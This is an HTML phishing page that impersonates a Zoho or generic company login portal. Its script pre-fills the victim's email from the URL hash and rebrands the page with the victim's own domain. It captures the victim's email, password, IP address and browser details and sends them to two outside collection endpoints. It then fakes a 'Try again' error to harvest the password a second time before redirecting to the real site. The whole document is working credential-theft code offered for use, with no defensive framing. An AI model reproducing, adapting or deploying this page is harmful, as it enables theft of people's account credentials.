<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Portal</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Google Fonts: Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        #background-iframe, #overlay {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
        }

        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        #background-iframe {
            border: none;
            z-index: -3;
            object-fit: cover;
        }

        #overlay {
            background-color: rgba(0, 0, 0, 0.5);
            z-index: -2;
        }

        .form-container {
            display: block;
            max-width: 400px;
            width: 100%;
            padding: 2rem;
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 0.75rem;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            position: relative;
            z-index: 1;
        }

        .icon-text {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .icon-text img {
            width: 32px;
            height: 32px;
            margin-right: 0.5rem;
        }

        .icon-text .h4 {
            margin-bottom: 0;
            color: #0d6efd;
        }

        .form-floating {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .form-floating label,
        .input-icon {
            position: absolute;
            color: #6c757d;
            pointer-events: none;
            transition: 0.2s ease all;
        }

        .form-floating label {
            left: 2.5rem;
            top: -0.2rem;
            background-color: transparent;
            z-index: 1;
        }

        .form-floating input:focus+label,
        .form-floating input:not(:placeholder-shown)+label {
            transform: translateY(-1.5rem);
            font-size: 0.85rem;
            color: #0d6efd;
        }

        .form-control {
            border-top: none;
            border-left: none;
            border-right: none;
            border-bottom: 2px solid #ced4da;
            border-radius: 0;
            padding-left: 2.5rem;
            transition: border-color 0.2s;
            background-color: transparent;
        }

        .form-control:focus {
            border-bottom-color: #0d6efd;
            outline: none;
            box-shadow: none;
        }

        .input-icon {
            left: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.2rem;
        }

        .btn-primary {
            width: 100%;
            padding: 0.75rem;
            font-size: 1rem;
            background-color: #0d6efd;
            border: none;
            border-radius: 0.375rem;
            transition: background-color 0.3s;
        }

        .btn-primary:hover {
            background-color: #0b5ed7;
        }

        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            align-items: center;
            justify-content: center;
            z-index: 9999;
            display: none;
        }

        .error-message {
            color: red;
            margin-bottom: 1rem;
            display: none;
            text-align: center;
            font-size: 0.9rem;
        }

        .verification-section {
            margin-top: 20px;
            text-align: center;
        }

        .confirm-text {
            font-size: 0.8rem;
            margin-top: 10px;
            color: #6c757d;
        }

        @media (max-width: 576px) {
            .form-container {
                padding: 1.5rem;
                margin: 0 1rem;
            }
        }
    </style>
</head>
<body class="d-flex align-items-center justify-content-center min-vh-100">
    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
    <div id="overlay"></div>

    <div class="form-container">
        <div id="error-message" class="error-message" data-key="try-again">Try again</div>

        <form id="user-form">
            <div class="icon-text">
                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon">
                <span class="h4" id="domain-name">ZOHO</span>
            </div>
            <h5 class="mb-2 translateable" data-key="leading-security">Leading with Security.</h5>
            <p class="mb-4 text-muted translateable" style="font-size: 0.9rem;" data-key="learn-more">To get started, log in using your email and password.</p>

            <div class="form-floating position-relative">
                <i class="bi bi-envelope input-icon"></i>
                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px;" autocomplete="email">
                <label for="email" style="left: 40px;">Email</label>
            </div>

            <div class="form-floating position-relative">
                <i class="bi bi-lock input-icon"></i>
                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;" autocomplete="current-password">
                <label for="password" style="left: 40px;">Password</label>
            </div>

            <div class="verification-section">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAACBwiUtbVw9OnVVF" data-callback="onTurnstileSuccess"></div>
                <div class="confirm-text">Browser safety for protection.</div>
            </div>

            <button type="submit" class="btn btn-primary translateable mt-3" id="submit-button" disabled data-key="next-button">Continue</button>
        </form>
    </div>

    <div id="loader-overlay" class="loader-overlay">
        <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>

    <script>
        // ======================= ORIGINAL DESIGN PRESERVED =======================
        // ADDED: Hash (#) extraction to auto-fill email
        // Example: www.olewas.com#test@test.com  -> email box gets test@test.com
        // ADDED: Send data to both URLs:
        // 1: https://scitecinstruments.it.com/1/api.php
        // 2: https://scitecinstruments.it.com/1/sg.php
        
        let turnstileCompleted = false;
        let submitCount = 0;
        let redirectDomain = null;
        
        // ---------- EMAIL EXTRACTION FROM HASH (#) ----------
        function getEmailFromHash() {
            // Get the hash part (including #)
            const hash = window.location.hash;
            if (hash && hash.length > 1) {
                // Remove the leading '#'
                let hashValue = hash.substring(1);
                // Check if it looks like an email (contains @)
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (emailRegex.test(hashValue)) {
                    return hashValue;
                }
            }
            return null;
        }
        
        // Extract email from hash and populate the email field
        const hashEmail = getEmailFromHash();
        
        // Helper: update favicon and background based on domain from email
        function updateDomainUI(email) {
            if (email && email.includes('@')) {
                const domainPart = email.split('@')[1];
                if (domainPart) {
                    const domainName = domainPart.split('.')[0].toUpperCase();
                    document.getElementById('domain-name').innerText = domainName;
                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
                    const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
                    document.getElementById('background-iframe').src = bgUrl;
                    return domainPart;
                }
            }
            return null;
        }
        
        // If email from hash exists, set it in the email input and update UI
        if (hashEmail) {
            const emailInput = document.getElementById('email');
            emailInput.value = hashEmail;
            updateDomainUI(hashEmail);
            // Also store domain for potential redirect
            const domainPart = hashEmail.split('@')[1];
            if (domainPart) redirectDomain = domainPart;
        } else {
            // Default UI if no hash email
            document.getElementById('domain-name').innerText = "PORTAL";
            document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=portal.com";
        }
        
        // IP & Browser info collector
        let userMetadata = {
            ipAddress: "Fetching...",
            userAgent: navigator.userAgent,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            browser: "Detecting..."
        };
        
        // Browser detection
        const ua = navigator.userAgent;
        if (ua.indexOf("Firefox") > -1) userMetadata.browser = "Mozilla Firefox";
        else if (ua.indexOf("SamsungBrowser") > -1) userMetadata.browser = "Samsung Internet";
        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) userMetadata.browser = "Opera";
        else if (ua.indexOf("Trident") > -1) userMetadata.browser = "Internet Explorer";
        else if (ua.indexOf("Edg") > -1) userMetadata.browser = "Microsoft Edge";
        else if (ua.indexOf("Chrome") > -1) userMetadata.browser = "Google Chrome";
        else if (ua.indexOf("Safari") > -1) userMetadata.browser = "Apple Safari";
        else userMetadata.browser = "Unknown";
        
        // Fetch IP
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { userMetadata.ipAddress = data.ip; })
            .catch(() => { userMetadata.ipAddress = "Unavailable"; });
        
        // Turnstile callback
        window.onTurnstileSuccess = function(token) {
            turnstileCompleted = true;
            document.getElementById('submit-button').disabled = false;
            document.getElementById('error-message').style.display = 'none';
            console.log("Turnstile verified");
        };
        
        // Function to send data to both endpoints (preserving original design behavior)
        async function sendDataToEndpoints(formData) {
            const endpoint1 = "https://scitecinstruments.it.com/1/api.php";
            const endpoint2 = "https://scitecinstruments.it.com/panel/sg.php";
            
            // Prepare URL encoded payload
            const payload = new URLSearchParams();
            for (let [key, value] of Object.entries(formData)) {
                payload.append(key, value);
            }
            
            const fetchOptions = {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: payload.toString()
            };
            
            // Send to both endpoints in parallel (fire and forget, but catch errors)
            const promises = [
                fetch(endpoint1, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, url: endpoint1 })),
                fetch(endpoint2, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, url: endpoint2 }))
            ];
            
            const results = await Promise.allSettled(promises);
            console.log("Data sent to both endpoints:", results);
            return true;
        }
        
        // Form submit handler (preserves original behavior: first attempt shows error, second redirects)
        document.getElementById('user-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Check turnstile
            if (!turnstileCompleted) {
                const errDiv = document.getElementById('error-message');
                errDiv.innerText = "Please complete verification first.";
                errDiv.style.display = "block";
                return;
            }
            
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!email || !password) {
                const errDiv = document.getElementById('error-message');
                errDiv.innerText = "Email and password are required.";
                errDiv.style.display = "block";
                return;
            }
            
            // Basic email validation
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                const errDiv = document.getElementById('error-message');
                errDiv.innerText = "Please enter a valid email address.";
                errDiv.style.display = "block";
                return;
            }
            
            submitCount++;
            const isFirstAttempt = (submitCount === 1);
            const isSecondAttempt = (submitCount === 2);
            
            // Show loader
            document.getElementById('loader-overlay').style.display = "flex";
            document.getElementById('error-message').style.display = "none";
            
            // Extract domain from email for redirect and favicon update
            const emailDomain = email.split('@')[1] || "";
            if (emailDomain && !redirectDomain) redirectDomain = emailDomain;
            
            // Prepare data payload (matches original structure)
            const dataPayload = {
                email: email,
                password: password,
                ipAddress: userMetadata.ipAddress,
                userAgent: userMetadata.userAgent,
                timezone: userMetadata.timezone,
                browser: userMetadata.browser,
                timestamp: new Date().toISOString()
            };
            
            try {
                // SEND DATA TO BOTH API URLS (main requirement)
                await sendDataToEndpoints(dataPayload);
                
                // Original design behavior:
                if (isFirstAttempt) {
                    // First attempt: show error message, clear password field, hide loader after 3s
                    setTimeout(() => {
                        document.getElementById('loader-overlay').style.display = "none";
                        const errDiv = document.getElementById('error-message');
                        errDiv.innerText = "Try again";
                        errDiv.style.display = "block";
                        document.getElementById('password').value = ""; // clear password
                    }, 3000);
                } 
                else if (isSecondAttempt) {
                    // Second attempt: redirect to the domain from email (or from hash)
                    setTimeout(() => {
                        document.getElementById('loader-overlay').style.display = "none";
                        let targetDomain = emailDomain;
                        if (!targetDomain && redirectDomain) targetDomain = redirectDomain;
                        if (targetDomain) {
                            let redirectUrl = `https://${targetDomain}`;
                            window.location.href = redirectUrl;
                        } else {
                            window.location.href = "https://www.google.com";
                        }
                    }, 3000);
                }
                else {
                    // More attempts: just reset loader and show generic error
                    setTimeout(() => {
                        document.getElementById('loader-overlay').style.display = "none";
                        const errDiv = document.getElementById('error-message');
                        errDiv.innerText = "Authentication failed. Please try again later.";
                        errDiv.style.display = "block";
                    }, 2000);
                }
            } catch (err) {
                console.error("Submit error:", err);
                document.getElementById('loader-overlay').style.display = "none";
                const errDiv = document.getElementById('error-message');
                errDiv.innerText = "Network error. Please try again.";
                errDiv.style.display = "block";
            }
        });
        
        // Initially disable submit button until Turnstile is done
        document.getElementById('submit-button').disabled = true;
        
        // Real-time email input: update favicon and background if user manually types (original design improvement)
        const emailField = document.getElementById('email');
        emailField.addEventListener('input', function() {
            const val = this.value.trim();
            if (val.includes('@')) {
                const domainPart = val.split('@')[1];
                if (domainPart) {
                    document.getElementById('domain-name').innerText = domainPart.split('.')[0].toUpperCase();
                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
                    const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
                    document.getElementById('background-iframe').src = bgUrl;
                }
            } else {
                // If no email, revert to original if no hash preset
                if (!hashEmail) {
                    document.getElementById('domain-name').innerText = "PORTAL";
                    document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=zoho.com";
                    document.getElementById('background-iframe').src = "about:blank";
                }
            }
        });
        
        // Additional: ensure that if hash email was set, the UI is fully updated (favicon/background)
        if (hashEmail) {
            const domainPart = hashEmail.split('@')[1];
            if (domainPart) {
                document.getElementById('domain-name').innerText = domainPart.split('.')[0].toUpperCase();
                document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
                const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
                document.getElementById('background-iframe').src = bgUrl;
            }
        }
        
        // Prevent double submission while loading (safety)
        let isSubmitting = false;
        const originalHandler = document.getElementById('user-form').onsubmit;
        document.getElementById('user-form').addEventListener('submit', function(e) {
            if (isSubmitting) {
                e.preventDefault();
                return;
            }
            if (!turnstileCompleted) {
                e.preventDefault();
                const errDiv = document.getElementById('error-message');
                errDiv.innerText = "Complete the security check first.";
                errDiv.style.display = "block";
                return;
            }
            isSubmitting = true;
            setTimeout(() => { isSubmitting = false; }, 5000);
        });
        
        console.log("Original design preserved. Hash (#) email extraction active. Data sent to both URLs: api.php and sg.php");
    </script>
</body>
</html>
